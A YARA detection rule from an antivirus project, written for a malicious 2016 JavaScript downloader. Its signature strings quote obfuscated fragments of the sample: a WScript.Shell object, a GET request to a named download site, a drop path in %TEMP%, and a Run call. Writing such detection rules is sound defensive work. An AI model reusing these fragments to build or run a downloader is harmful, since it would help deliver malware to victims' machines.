rule sig_20160427_a948bd30e6140eea3108f0db36e0af1b {
  meta:
    description = "datamaliciousorder - file 20160427_a948bd30e6140eea3108f0db36e0af1b.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "664155a3950db4393a5694d20bed30fd329ebdb0dab32be75ca603a917f4367e"

  strings:
    $s1  = "ZfwupFyyae[XchgaYvccw](\"G\" + \"ET\", \"http://aaacollectionsjewelry.com/ur8fgs\", false);" fullword ascii
    $s2  = "function PcuwvNlyrl() {return ZozatBrzgl[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"y38Occu" ascii
    $s3  = "function PcuwvNlyrl() {return ZozatBrzgl[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"y38Occu" ascii
    $s4  = "function FtirnVcirn(OqzzdXzeoq, HpygaNkemy){TecntOcety = TecntOcety * 1; return OqzzdXzeoq - HpygaNkemy;};" fullword ascii
    $s5  = "var TdcfvDtcft = this[\"WScript\"];" fullword ascii
    $s6  = "var ZozatBrzgl = function DaofgKkrca() {return TdcfvDtcft[JlfdeUywve](\"WScript\"+\".Shell\");}(), HopxiMbkrv = 11;" fullword ascii
    $s7  = "function EhwvuZmgcy(){return HftbgXomhn + \"\";};" fullword ascii
    $s8  = "if (ZfwupFyyae[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s9  = "function JacljBohtm() {return ((ZepmnCtpui == true) && (ZepmnCtpui == JjsbkLxtss)) ? 1 : TecntOcety;};" fullword ascii
    $s10 = "JjsbkLxtss = true; " fullword ascii
    $s11 = "var HmzbiVapjb = new this[\"D\"+\"ate\"]();" fullword ascii
    $s12 = "var JjsbkLxtss = false;" fullword ascii
    $s13 = "function QricsYvazd(){return 23;};" fullword ascii
    $s14 = "var ZepmnCtpui = false;" fullword ascii
    $s15 = "return FtirnVcirn(HwblaHotxe, MjaiiGdoua);" fullword ascii
    $s16 = "}while (XvovfFdrui);" fullword ascii
    $s17 = "ZepmnCtpui = true; " fullword ascii
    $s18 = "function ZvskhIqglo(HewbuTaobh){ZozatBrzgl[\"R\"+\"un\"](HewbuTaobh, TecntOcety, TecntOcety);};" fullword ascii
    $s19 = "var PbgvqWasdl = false;" fullword ascii
    $s20 = "function DjksvVsawq(){return JlfdeUywve;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}